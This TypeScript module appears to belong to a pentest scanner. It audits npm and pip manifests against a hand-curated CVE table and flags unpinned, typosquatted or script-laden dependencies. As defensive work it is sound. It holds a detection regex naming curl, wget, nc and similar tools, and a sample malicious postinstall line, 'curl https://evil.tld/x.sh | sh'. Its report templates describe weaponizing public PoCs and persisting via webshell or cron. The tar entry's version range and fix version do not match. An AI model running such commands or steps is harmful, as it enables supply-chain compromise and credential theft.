// CrackScope Part 7 — dependency & supply-chain audit.
// Parses dependency manifests (package.json, requirements.txt) and
// lockfiles (package-lock.json) offline, matches declared versions against
// a curated known-vulnerability database (CVE-mapped), and flags
// supply-chain hygiene issues: unpinned deps, malicious install-script
// patterns, and likely typosquatting. Produces the same Finding shape as
// the source rules so everything flows into the pentest report.
import type { Finding, ScanInput, Severity } from "./scanner";

const OWASP_DEPS = "A06:2021 – Vulnerable and Outdated Components";
const CATEGORY = "Vulnerable Dependencies";

// ---------- version handling ----------

/** "1.2.3-beta.1" -> [1,2,3]; returns null for ranges/tags it can't parse. */
function parseVersion(v: string): number[] | null {
  const m = v.trim().replace(/^v/, "").match(/^(\d+)\.(\d+)\.(\d+)/);
  if (!m) return null;
  return [Number(m[1]), Number(m[2]), Number(m[3])];
}

function cmpVersion(a: number[], b: number[]): number {
  for (let i = 0; i < 3; i++) {
    if (a[i] !== b[i]) return a[i] - b[i];
  }
  return 0;
}

function lt(v: number[], x: string): boolean {
  const p = parseVersion(x);
  return p !== null && cmpVersion(v, p) < 0;
}
function gte(v: number[], x: string): boolean {
  const p = parseVersion(x);
  return p !== null && cmpVersion(v, p) >= 0;
}

// ---------- curated vulnerability database (offline) ----------

interface VulnEntry {
  title: string;
  severity: Severity;
  /** Semver-safe match against a concrete installed version. */
  vulnerable: (v: number[]) => boolean;
  fixedIn: string;
  cves: string[];
  summary: string;
  remediation: string;
}

const NPM_VULNS: Record<string, VulnEntry[]> = {
  lodash: [
    {
      title: "lodash command injection via _.template",
      severity: "high",
      vulnerable: (v) => lt(v, "4.17.21"),
      fixedIn: "4.17.21",
      cves: ["CVE-2021-23337"],
      summary: "_.template interpolates an attacker-controlled string as code, enabling command injection on any server that templates user input.",
      remediation: "Upgrade lodash to >= 4.17.21; avoid templating untrusted strings.",
    },
  ],
  axios: [
    {
      title: "axios SSRF via redirect following",
      severity: "high",
      vulnerable: (v) => gte(v, "0.18.0") && lt(v, "0.21.4"),
      fixedIn: "0.21.4",
      cves: ["CVE-2020-28168", "CVE-2021-3749"],
      summary: "Follows cross-origin redirects with the original headers (leaking credentials), plus a ReDoS in trim parsing.",
      remediation: "Upgrade axios to >= 0.21.4 and keep redirects disabled for credential-bearing requests.",
    },
  ],
  "node-fetch": [
    {
      title: "node-fetch forwards Authorization header on cross-origin redirect",
      severity: "high",
      vulnerable: (v) => lt(v, "2.6.7"),
      fixedIn: "2.6.7",
      cves: ["CVE-2022-0235"],
      summary: "Credentials (Authorization, Cookie) are replayed to a different origin after a redirect, leaking them to the redirect target.",
      remediation: "Upgrade node-fetch to >= 2.6.7 (or >= 3.x).",
    },
  ],
  minimist: [
    {
      title: "minimist prototype pollution via crafted argv",
      severity: "high",
      vulnerable: (v) => lt(v, "1.2.6"),
      fixedIn: "1.2.6",
      cves: ["CVE-2021-44906"],
      summary: "Deeply crafted CLI arguments extend Object.prototype, flipping security-relevant defaults application-wide.",
      remediation: "Upgrade minimist to >= 1.2.6 or move to util.parseArgs.",
    },
  ],
  ejs: [
    {
      title: "ejs server-side template injection (RCE)",
      severity: "critical",
      vulnerable: (v) => lt(v, "3.1.7"),
      fixedIn: "3.1.7",
      cves: ["CVE-2022-29078"],
      summary: "The settings[view options] merge allows an attacker to set outputFunctionName and escape into the compiled template — full RCE on the server.",
      remediation: "Upgrade ejs to >= 3.1.7; never pass user input into render options.",
    },
  ],
  jsonwebtoken: [
    {
      title: "jsonwebtoken insecure token handling",
      severity: "high",
      vulnerable: (v) => lt(v, "9.0.0"),
      fixedIn: "9.0.0",
      cves: ["CVE-2022-23529", "CVE-2022-23540"],
      summary: "Versions < 9 can be coerced into mis-verifying signatures (type-confusion in key handling, algorithm confusion in decode).",
      remediation: "Upgrade jsonwebtoken to >= 9.0.0 and always pin the accepted algorithms at verify.",
    },
  ],
  underscore: [
    {
      title: "underscore arbitrary code execution via _.template",
      severity: "high",
      vulnerable: (v) => lt(v, "1.12.1"),
      fixedIn: "1.12.1",
      cves: ["CVE-2021-23358"],
      summary: "_.template compiles attacker-controlled variable text into executable JS — code execution wherever untrusted strings are templated.",
      remediation: "Upgrade underscore to >= 1.12.1.",
    },
  ],
  jquery: [
    {
      title: "jQuery XSS via untrusted HTML (naming/regex bypass)",
      severity: "medium",
      vulnerable: (v) => lt(v, "3.5.0"),
      fixedIn: "3.5.0",
      cves: ["CVE-2020-11022", "CVE-2020-11023"],
      summary: "$.htmlPrefilter mishandles crafted <option>/<img> markup, executing script even from sanitized-looking strings in older patterns.",
      remediation: "Upgrade jQuery to >= 3.5.0; prefer DOM APIs for untrusted HTML.",
    },
  ],
  angular: [
    {
      title: "AngularJS 1.x sandbox escape / XSS",
      severity: "high",
      vulnerable: (v) => gte(v, "1.0.0") && lt(v, "1.8.3"),
      fixedIn: "1.8.3 (or migrate)",
      cves: ["CVE-2022-25844", "CVE-2022-25869"],
      summary: "AngularJS 1.x expressions are sandbox-escaped by public techniques; template injection becomes stored/reflected XSS. Framework is EOL.",
      remediation: "Migrate off AngularJS 1.x; it is end-of-life and unpatched.",
    },
  ],
  semver: [
    {
      title: "semver ReDoS on crafted version string",
      severity: "low",
      vulnerable: (v) => lt(v, "5.7.2") || (gte(v, "6.0.0") && lt(v, "6.3.1")),
      fixedIn: "6.3.1 / 5.7.2",
      cves: ["CVE-2022-25883"],
      summary: "A pathological version string passed to semver stalls the event loop — a DoS vector for any service comparing user-supplied versions.",
      remediation: "Upgrade semver to >= 6.3.1 (or >= 5.7.2 on v5).",
    },
  ],
  tar: [
    {
      title: "tar arbitrary file overwrite / abspath traversal",
      severity: "high",
      vulnerable: (v) => gte(v, "6.0.0") && lt(v, "6.1.7"),
      fixedIn: "6.1.9",
      cves: ["CVE-2021-37701", "CVE-2021-37712", "CVE-2021-37713"],
      summary: "Malicious archives write outside the extraction directory via symlink/cleaned-path confusion — used by real supply-chain attacks to plant backdoors.",
      remediation: "Upgrade tar to >= 6.1.9.",
    },
  ],
  "follow-redirects": [
    {
      title: "follow-redirects leaks proxies/secure cookies on redirect",
      severity: "medium",
      vulnerable: (v) => gte(v, "1.0.0") && lt(v, "1.14.7"),
      fixedIn: "1.14.7",
      cves: ["CVE-2022-0536"],
      summary: "Sensitive headers follow redirects to another host, exposing credentials to the redirect target.",
      remediation: "Upgrade follow-redirects to >= 1.14.7.",
    },
  ],
  ws: [
    {
      title: "ws DoS via crafted HTTP request",
      severity: "medium",
      vulnerable: (v) => gte(v, "6.0.0") && lt(v, "7.4.6"),
      fixedIn: "7.4.6",
      cves: ["CVE-2021-21362"],
      summary: "A crafted HTTP request with many Connection headers causes unbounded memory growth, crashing the socket server.",
      remediation: "Upgrade ws to >= 7.4.6 (or >= 8.x).",
    },
  ],
  multer: [
    {
      title: "multer Denial of Service via malformed multipart request",
      severity: "medium",
      vulnerable: (v) => gte(v, "1.4.0") && lt(v, "1.4.4-lts.1"),
      fixedIn: "1.4.4-lts.1",
      cves: ["CVE-2020-7685", "CVE-2021-3653"],
      summary: "Malformed multipart uploads abort the request bus / exhaust handlers, taking down upload endpoints.",
      remediation: "Upgrade multer to >= 1.4.4-lts.1 and cap upload size.",
    },
  ],
  mongoose: [
    {
      title: "mongoose query injection via sanitized:false option",
      severity: "high",
      vulnerable: (v) => gte(v, "4.0.0") && lt(v, "5.13.15"),
      fixedIn: "5.13.15",
      cves: ["CVE-2023-3696"],
      summary: "Documents built from raw request objects can carry $-operators straight into queries, enabling the classic NoSQL login bypass.",
      remediation: "Upgrade mongoose to >= 5.13.15 and validate query inputs with a schema.",
    },
  ],
  "shell-quote": [
    {
      title: "shell-quote command injection in parse",
      severity: "high",
      vulnerable: (v) => lt(v, "1.7.3"),
      fixedIn: "1.7.3",
      cves: ["CVE-2021-42740"],
      summary: "The parse operation can execute an arbitrary command on a Windows host; crafted tokens also break shell escaping on POSIX.",
      remediation: "Upgrade shell-quote to >= 1.7.3.",
    },
  ],
  netmask: [
    {
      title: "netmask IP-range parsing SSRF bypass",
      severity: "high",
      vulnerable: (v) => lt(v, "1.0.7"),
      fixedIn: "1.0.7",
      cves: ["CVE-2021-28918"],
      summary: "Improper parsing of bracketed/decimal IPs lets crafted addresses bypass private-range allowlists — the guard fails exactly when it matters.",
      remediation: "Upgrade netmask to >= 1.0.7 and re-check private-range filtering.",
    },
  ],
  "yargs-parser": [
    {
      title: "yargs-parser prototype pollution via crafted args",
      severity: "medium",
      vulnerable: (v) => lt(v, "5.0.1") || (gte(v, "13.0.0") && lt(v, "13.1.2")) || (gte(v, "15.0.0") && lt(v, "15.0.1")) || (gte(v, "18.0.0") && lt(v, "18.1.2")),
      fixedIn: "18.1.2",
      cves: ["CVE-2020-7608"],
      summary: "__proto__-bearing argv pollutes Object.prototype, corrupting defaults that auth and config logic depend on.",
      remediation: "Upgrade yargs-parser to a patched line (>= 18.1.2 recommended).",
    },
  ],
  "ansi-regex": [
    {
      title: "ansi-regex ReDoS",
      severity: "low",
      vulnerable: (v) => gte(v, "2.0.0") && lt(v, "5.0.1"),
      fixedIn: "5.0.1",
      cves: ["CVE-2021-3807"],
      summary: "Crafted ANSI strings stall regex processing — DoS in any CLI or log pipeline handling untrusted input.",
      remediation: "Force ansi-regex >= 5.0.1 via overrides/resolutions.",
    },
  ],
  "glob-parent": [
    {
      title: "glob-parent ReDoS",
      severity: "low",
      vulnerable: (v) => lt(v, "5.1.2"),
      fixedIn: "5.1.2",
      cves: ["CVE-2021-35065"],
      summary: "Untrusted glob strings stall the regex engine — DoS in file-watching pipelines.",
      remediation: "Upgrade glob-parent to >= 5.1.2.",
    },
  ],
  nanoid: [
    {
      title: "nanoid predictable ID generation (info exposure)",
      severity: "medium",
      vulnerable: (v) => gte(v, "3.0.0") && lt(v, "3.3.8"),
      fixedIn: "3.3.8",
      cves: ["CVE-2024-24560", "CVE-2024-13939"],
      summary: "Affects ID uniqueness guarantees in specific call patterns; IDs used as session or object references become predictable.",
      remediation: "Upgrade nanoid to >= 3.3.8 (or >= 5.x); never use IDs as secrets.",
    },
  ],
};

const PIP_VULNS: Record<string, VulnEntry[]> = {
  django: [
    {
      title: "django multiple patched vulnerabilities (SQLi / path traversal)",
      severity: "high",
      vulnerable: (v) => lt(v, "3.2.12") || (gte(v, "4.0.0") && lt(v, "4.0.2")),
      fixedIn: "4.0.2 / 3.2.12 LTS",
      cves: ["CVE-2021-45452", "CVE-2022-0575"],
      summary: "Multiple issues in the range: path traversal in storages and SQL injection via crafted column aliases.",
      remediation: "Upgrade Django to a supported patch release (>= 3.2.12 LTS or >= 4.0.2).",
    },
  ],
  flask: [
    {
      title: "flask JSON data injection / trusted-host issues",
      severity: "medium",
      vulnerable: (v) => lt(v, "0.12.3"),
      fixedIn: "0.12.3 (or 2.x)",
      cves: ["CVE-2018-1000656"],
      summary: "JSON responses with untrusted keys can inject arbitrary HTML/JS into the DOM of JSON endpoints in old Flask versions.",
      remediation: "Upgrade Flask to >= 0.12.3 (prefer a current 2.x/3.x line).",
    },
  ],
  requests: [
    {
      title: "requests leaks auth on redirect to another origin",
      severity: "high",
      vulnerable: (v) => lt(v, "2.20.0"),
      fixedIn: "2.20.0",
      cves: ["CVE-2018-18074"],
      summary: "Authorization headers are re-sent after a redirect to a different host, leaking credentials to the redirect target.",
      remediation: "Upgrade requests to >= 2.20.0 and strip auth headers before redirecting manually.",
    },
  ],
  jinja2: [
    {
      title: "jinja2 ReDoS in the lexer",
      severity: "medium",
      vulnerable: (v) => lt(v, "2.11.3"),
      fixedIn: "2.11.3",
      cves: ["CVE-2020-28493"],
      summary: "Crafted template input stalls the Jinja lexer — DoS on any endpoint rendering untrusted templates.",
      remediation: "Upgrade Jinja2 to >= 2.11.3 (prefer >= 3.0).",
    },
  ],
  pyyaml: [
    {
      title: "pyyaml arbitrary code execution via yaml.load",
      severity: "critical",
      vulnerable: (v) => lt(v, "5.4"),
      fixedIn: "5.4",
      cves: ["CVE-2020-1747", "CVE-2020-14343"],
      summary: "yaml.load with the FullLoader bypass constructs python/object instances — RCE from any untrusted YAML document.",
      remediation: "Upgrade PyYAML to >= 5.4 and always call yaml.safe_load for untrusted data.",
    },
  ],
  pillow: [
    {
      title: "pillow image-parsing RCE / buffer overflows",
      severity: "high",
      vulnerable: (v) => lt(v, "8.1.1"),
      fixedIn: "8.1.1",
      cves: ["CVE-2020-10177", "CVE-2020-10178", "CVE-2020-10378"],
      summary: "Multiple out-of-bounds read/write bugs in image parsers — crafted uploads crash the worker or worse on any app processing user images.",
      remediation: "Upgrade Pillow to >= 8.1.1 and re-encode uploads before processing.",
    },
  ],
};

const POPULAR_NPM = new Set([
  "react", "vue", "angular", "express", "lodash", "axios", "request", "fs-extra",
  "moment", "chalk", "commander", "glob", "yargs", "debug", "underscore", "jquery",
  "typescript", "webpack", "babel-core", "eslint", "jest", "mocha", "chai",
  "react-dom", "next", "body-parser", "mongoose", "mongodb", "mysql", "pg",
  "redis", "jsonwebtoken", "passport", "socket.io", "ws", "uuid", "moment-timezone",
  "async", "bluebird", "rimraf", "mkdirp", "semver", "cross-env", "dotenv",
  "nodemon", "concurrently", "prettier", "classnames", "styled-components",
  "tailwindcss", "framer-motion", "zod", "date-fns", "dayjs", "ramda", "immer",
]);

// ---------- finding helpers ----------

function finding(args: {
  ruleId: string;
  title: string;
  severity: Severity;
  file: string;
  line: number;
  snippet: string;
  description: string;
  remediation: string;
  payload: string;
}): Finding {
  return {
    ruleId: args.ruleId,
    title: args.title,
    severity: args.severity,
    category: CATEGORY,
    owasp: OWASP_DEPS,
    file: args.file,
    line: args.line,
    snippet: args.snippet.slice(0, 220),
    description: args.description,
    remediation: args.remediation,
    payload: args.payload,
  };
}

function depPayload(name: string, cves: string[], summary: string): string {
  return `Supply-chain attack path: weaponize ${cves.join("/")} against ${name}.\nStep 1: fingerprint the stack (response headers, package files in git) — ${name} at a vulnerable version confirmed.\nStep 2: send the public PoC payload for the flaw: ${summary}\nStep 3: persist (webshell, cron, or dependency confusion on the next install).\nEffect: RCE or data exfiltration with zero custom exploitation — the PoC is public.`;
}

/** Find the 1-indexed line in a manifest that declares a dependency (best effort). */
function findLine(lines: string[], needle: string): number {
  const variants = [needle, `node_modules/${needle}`, `@"${needle}"`, `"${needle}"`];
  for (const variant of variants) {
    for (let i = 0; i < lines.length; i++) {
      if (lines[i].includes(variant)) return i + 1;
    }
  }
  return 1;
}

// ---------- package.json audit ----------

function auditPackageJson(input: ScanInput): Finding[] {
  const lines = input.content.split("\n");
  let manifest: {
    dependencies?: Record<string, string>;
    devDependencies?: Record<string, string>;
    scripts?: Record<string, string>;
  } | null = null;
  try {
    manifest = JSON.parse(input.content);
  } catch {
    return [];
  }
  if (!manifest) return [];

  const findings: Finding[] = [];
  const declared = new Set<string>();

  const auditDeps = (deps: Record<string, string>, kind: string) => {
    for (const [name, range] of Object.entries(deps)) {
      declared.add(name);
      const line = findLine(lines, name);

      // Known-vulnerable version check
      const db = NPM_VULNS[name];
      const version = parseVersion(range);
      if (db && version) {
        for (const entry of db) {
          if (!entry.vulnerable(version)) continue;
          findings.push(
            finding({
              ruleId: "DEP-001",
              title: `Vulnerable dependency: ${name} ${range} (${entry.cves.join(", ")})`,
              severity: entry.severity,
              file: input.name,
              line,
              snippet: `"${name}": "${range}"  // in ${kind}`,
              description: `${name} is pinned to a known-vulnerable version. ${entry.summary} Public exploits and PoCs exist — attackers scan for these exact version ranges.`,
              remediation: entry.remediation,
              payload: depPayload(name, entry.cves, entry.summary),
            }),
          );
        }
      }

      // Unpinned / unsafe range hygiene
      const unpinned =
        range === "*" || range === "latest" || range.startsWith("git+") || range.startsWith("file:") || (!/[.\d]/.test(range) && !range.startsWith("^") && !range.startsWith("~"));
      if (unpinned) {
        findings.push(
          finding({
            ruleId: "SUPPLY-002",
            title: `Unpinned dependency: ${name} (${range})`,
            severity: "low",
            file: input.name,
            line,
            snippet: `"${name}": "${range}"  // in ${kind}`,
            description:
              "The dependency is not pinned to a concrete version. Every install may pull an unpredictable newer release — a compromised or malicious new version ships silently with the next deploy (the mechanism behind real supply-chain attacks like the event-stream and ua-parser-js incidents).",
            remediation:
              'Pin exact versions (no "^"/"~"/"*") or use a lockfile with integrity-checked CI installs ("npm ci").',
            payload: `Attack: attacker publishes a compromised ${name} release that matches the loose range.\nEffect: next npm install executes attacker code inside your build — build-server credential theft.`,
          }),
        );
      }

      // Typosquatting heuristic (Levenshtein distance 1 to a popular package)
      if (!POPULAR_NPM.has(name) && !name.startsWith("@")) {
        for (const popular of POPULAR_NPM) {
          if (levenshtein(name, popular) === 1) {
            findings.push(
              finding({
                ruleId: "SUPPLY-003",
                title: `Possible typosquatting: ${name} (near ${popular})`,
                severity: "medium",
                file: input.name,
                line,
                snippet: `"${name}": "${range}"  // in ${kind}`,
                description: `"${name}" is one edit away from the popular package "${popular}". Typosquat packages deliberately mimic popular names to harvest installs, and some run credential-stealing code in postinstall scripts.`,
                remediation: `Verify ${name} is the package you intend (download counts, repository, maintainers). If it was meant to be ${popular}, fix the name.`,
                payload: `Attack: victim or build agent installs ${name} instead of ${popular}.\nEffect: postinstall script exfiltrates env/secrets or implants a backdoor into the artifact.`,
              }),
            );
            break;
          }
        }
      }
    }
  };

  if (manifest.dependencies) auditDeps(manifest.dependencies, "dependencies");
  if (manifest.devDependencies) auditDeps(manifest.devDependencies, "devDependencies");

  // Malicious install-script heuristics
  const scripts = manifest.scripts ?? {};
  const dangerousScriptRe = /\b(curl|wget|nc|ncat|eval|base64\s+-d|powershell|iex|chmod|node\s+-e)\b/i;
  for (const [script, cmd] of Object.entries(scripts)) {
    if (dangerousScriptRe.test(cmd)) {
      findings.push(
        finding({
          ruleId: "SUPPLY-001",
          title: `Suspicious install/lifecycle script: "${script}"`,
          severity: "high",
          file: input.name,
          line: findLine(lines, `"${script}"`),
          snippet: `"${script}": "${cmd}"`,
          description:
            "A lifecycle script shells out to network/exec tools. This is exactly how npm supply-chain attacks (e.g. ua-parser-js, colors) executed: malicious postinstall code downloaded and ran payloads during install, inside CI with your credentials.",
          remediation:
            "Remove network calls from lifecycle scripts. Prefer explicit build steps reviewed in the repository, and run installs with --ignore-scripts in CI for untrusted trees.",
          payload: `Attack: attacker publishes a patched release adding: postinstall: curl https://evil.tld/x.sh | sh\nEffect: your CI runner executes attacker code with repo tokens and deploy keys.`,
        }),
      );
    }
  }

  return findings;
}

// ---------- package-lock.json transitive audit ----------

function auditPackageLock(input: ScanInput): Finding[] {
  let lock: { packages?: Record<string, { version?: string }>; dependencies?: Record<string, { version?: string; requires?: Record<string, string> }> } | null = null;
  try {
    lock = JSON.parse(input.content);
  } catch {
    return [];
  }
  if (!lock) return [];

  const lines = input.content.split("\n");
  const findings: Finding[] = [];
  const audited = new Set<string>();

  const auditResolved = (name: string, version: string | undefined, direct: boolean) => {
    if (!version || audited.has(`${name}@${version}`)) return;
    audited.add(`${name}@${version}`);
    const db = NPM_VULNS[name];
    const parsed = parseVersion(version);
    if (!db || !parsed) return;
    for (const entry of db) {
      if (!entry.vulnerable(parsed)) continue;
      findings.push(
        finding({
          ruleId: "DEP-002",
          title: `Vulnerable transitive dependency: ${name} ${version} (${entry.cves.join(", ")})`,
          severity: entry.severity,
          file: input.name,
          line: findLine(lines, `node_modules/${name}`),
          snippet: `"node_modules/${name}": { "version": "${version}" }${direct ? "" : "  // pulled in transitively"}`,
          description: `${direct ? "A direct dependency" : "A transitive dependency (pulled in by one of your dependencies)"} resolves to a known-vulnerable version in the lockfile. ${entry.summary} You don't import it directly for it to be exploitable — the code runs inside your process.`,
          remediation: `${entry.remediation} For transitive hits, add an npm "overrides" entry pinning ${name} to >= ${entry.fixedIn} and re-lock.`,
          payload: depPayload(name, entry.cves, entry.summary),
        }),
      );
    }
  };

  // lockfileVersion 2/3: flat packages map
  for (const [key, entry] of Object.entries(lock.packages ?? {})) {
    const name = key.replace(/^node_modules\//, "").replace(/.*node_modules\//, "");
    auditResolved(name, entry?.version, key === `node_modules/${name}`);
  }
  // lockfileVersion 1: nested dependencies map
  for (const [name, entry] of Object.entries(lock.dependencies ?? {})) {
    auditResolved(name, entry?.version, false);
  }

  return findings;
}

// ---------- requirements.txt audit ----------

function auditRequirementsTxt(input: ScanInput): Finding[] {
  const findings: Finding[] = [];
  const lines = input.content.split("\n");
  for (let i = 0; i < lines.length; i++) {
    const raw = lines[i].trim();
    if (!raw || raw.startsWith("#") || raw.startsWith("-")) continue;
    const m = raw.match(/^([A-Za-z0-9_.-]+)\s*[=~<>!]+\s*([0-9][\w.]*)/);
    if (!m) continue;
    const [, name, version] = m;
    const lower = name.toLowerCase();
    const db = PIP_VULNS[lower];
    const parsed = parseVersion(version);
    if (!db || !parsed) continue;
    for (const entry of db) {
      if (!entry.vulnerable(parsed)) continue;
      findings.push(
        finding({
          ruleId: "DEP-003",
          title: `Vulnerable dependency: ${name} ${version} (${entry.cves.join(", ")})`,
          severity: entry.severity,
          file: input.name,
          line: i + 1,
          snippet: raw,
          description: `${name} is pinned to a known-vulnerable version. ${entry.summary} Public PoCs exist for these ranges.`,
          remediation: entry.remediation,
          payload: depPayload(name, entry.cves, entry.summary),
        }),
      );
    }
  }
  return findings;
}

// ---------- entry point ----------

const MANIFEST_NAMES = new Set([
  "package.json",
  "package-lock.json",
  "requirements.txt",
  "npm-shrinkwrap.json",
]);

/** Returns findings when the input is a dependency manifest / lockfile. */
export function auditDependencies(input: ScanInput): Finding[] {
  const base = input.name.split("/").pop()?.toLowerCase() ?? "";
  if (!MANIFEST_NAMES.has(base)) return [];
  if (base === "package.json") return auditPackageJson(input);
  if (base === "package-lock.json" || base === "npm-shrinkwrap.json") return auditPackageLock(input);
  if (base === "requirements.txt") return auditRequirementsTxt(input);
  return [];
}

/** Files the intake should additionally admit because they are manifests. */
export function isDependencyManifest(name: string): boolean {
  const base = name.split("/").pop()?.toLowerCase() ?? "";
  return MANIFEST_NAMES.has(base);
}

// ---------- utils ----------

function levenshtein(a: string, b: string): number {
  const m = a.length;
  const n = b.length;
  if (Math.abs(m - n) > 1) return 2;
  let prev = Array.from({ length: n + 1 }, (_, i) => i);
  for (let i = 1; i <= m; i++) {
    const cur = [i];
    for (let j = 1; j <= n; j++) {
      cur[j] = Math.min(prev[j] + 1, cur[j - 1] + 1, prev[j - 1] + (a[i - 1] === b[j - 1] ? 0 : 1));
    }
    prev = cur;
  }
  return prev[n];
}
